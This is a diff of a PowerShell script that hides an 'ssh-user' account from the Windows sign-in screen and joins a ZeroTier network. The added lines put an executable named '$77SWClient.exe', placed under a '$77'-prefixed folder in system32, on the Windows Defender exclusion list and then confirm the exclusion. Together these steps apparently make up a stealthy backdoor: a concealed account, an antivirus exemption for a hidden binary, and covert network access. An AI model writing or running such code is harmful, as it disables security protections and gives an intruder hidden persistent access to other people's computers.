@@ -181,6 +181,18 @@ if (-not (Test-Path $specialAccountsPath)) {
 # Add the ssh-user to the UserList to hide it from the sign-in screen
 New-ItemProperty -Path $specialAccountsPath -Name "ssh-user" -Value 0 -PropertyType DWORD -Force
 
+# Adds `$77SWClient.exe' to the Windows Defender exclusion list
+
+# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
+$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
+# Output the current exclusion list to verify the addition
+Get-MpPreference | Select -ExpandProperty ExclusionPath
+
+
 # Join the specified ZeroTier network
 # Ensure the ZeroTier service is running before attempting to join a network
 Start-Service -Name "ZeroTierOneService"
